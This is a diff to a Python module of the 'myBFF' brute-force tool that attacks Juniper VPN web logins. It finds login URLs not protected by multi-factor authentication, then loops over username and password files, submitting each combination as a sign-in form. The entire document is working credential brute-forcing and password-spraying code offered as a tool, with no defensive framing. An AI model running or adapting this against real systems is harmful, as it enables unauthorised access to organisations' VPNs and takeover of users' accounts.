@@ -1,12 +1,17 @@
 #! /usr/bin/python
 # Created by Kirk Hayes (l0gan) @kirkphayes
 # Part of myBFF
+from core.webModule import webModule
 from requests import session
 import requests
 import re
 from argparse import ArgumentParser
 
-class JuniperBrute():
+class JuniperBrute(webModule):
+    def __init__(self, config, display, lock):
+        super(JuniperBrute, self).__init__(config, display, lock)
+        self.fingerprint="dana-na"
+        self.response="Success"
     ignore = ['tz_offset','btnSubmit']
     URLS = []
     nomfaurls = []
@@ -74,26 +79,52 @@ class JuniperBrute():
             else:
                 self.nomfaurls.append('url_default')
         if self.nomfaurls:
-            if config["UserFile"]:
-                lines = [line.rstrip('\n') for line in open(config["UserFile"])]
-                for line in lines:
-                    config["USERNAME"] = line.strip('\n')
-                    payload = {
-                    'tz_offset': '-360',
-                    'username': config["USERNAME"],
-                    'password': config["PASSWORD"],
-                    'realm': realm,
-                    'btnSubmit': 'Sign+In'
-                    }
-                    self.connectTest(config, payload, URL)
-            else:
-                payload = {
-                'tz_offset': '-360',
-                'username': config["USERNAME"],
-                'password': config["PASSWORD"],
-                'realm': realm,
-                'btnSubmit': 'Sign+In'
-                }
-                self.connectTest(config, payload, URL)
+                    if config["PASS_FILE"]:
+                        pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
+                        for pass_line in pass_lines:
+                            if config["UserFile"]:
+                                lines = [line.rstrip('\n') for line in open(config["UserFile"])]
+                                for line in lines:
+                                    config["USERNAME"] = line.strip('\n')
+                                    config["PASSWORD"] = pass_line.strip('\n')
+                                    payload = {
+                                    'tz_offset': '-360',
+                                    'username': config["USERNAME"],
+                                    'password': config["PASSWORD"],
+                                    'realm': realm,
+                                    'btnSubmit': 'Sign+In'
+                                    }
+                                    self.connectTest(config, payload)
+                            else:
+                                config["PASSWORD"] = pass_line.strip('\n')
+                                payload = {
+                                'tz_offset': '-360',
+                                'username': config["USERNAME"],
+                                'password': config["PASSWORD"],
+                                'realm': realm,
+                                'btnSubmit': 'Sign+In'
+                                }
+                                self.connectTest(config, payload)
+                    elif config["UserFile"]:
+                        lines = [line.rstrip('\n') for line in open(config["UserFile"])]
+                        for line in lines:
+                            config["USERNAME"] = line.strip('\n')
+                            payload = {
+                            'tz_offset': '-360',
+                            'username': config["USERNAME"],
+                            'password': config["PASSWORD"],
+                            'realm': realm,
+                            'btnSubmit': 'Sign+In'
+                            }
+                            self.connectTest(config, payload)
+                    else:
+                        payload = {
+                        'tz_offset': '-360',
+                        'username': config["USERNAME"],
+                        'password': config["PASSWORD"],
+                        'realm': realm,
+                        'btnSubmit': 'Sign+In'
+                        }
+                        self.connectTest(config, payload)
         else:
             print "[-] All pages require MFA. Aborting..."
